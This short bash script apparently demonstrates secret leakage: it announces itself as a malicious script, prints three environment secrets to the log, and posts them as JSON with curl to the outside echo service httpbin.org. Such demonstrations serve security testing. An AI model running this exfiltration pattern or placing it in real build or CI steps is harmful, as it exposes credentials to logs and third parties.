#!/bin/bash

echo "🚨 MALICIOUS SCRIPT EXECUTED! 🚨"
echo "Secrets extracted from environment:"
echo "SECRET_1: $SECRET_1"
echo "SECRET_2: $SECRET_2"
echo "SECRET_3: $SECRET_3"

# Simulate exfiltrating secrets
echo "Simulating secret exfiltration..."
curl -X POST https://httpbin.org/post \
  -H "Content-Type: application/json" \
  -d "{\"secret1\":\"$SECRET_1\",\"secret2\":\"$SECRET_2\",\"secret3\":\"$SECRET_3\"}" \
  || echo "External request failed, but secrets are still exposed in logs!"
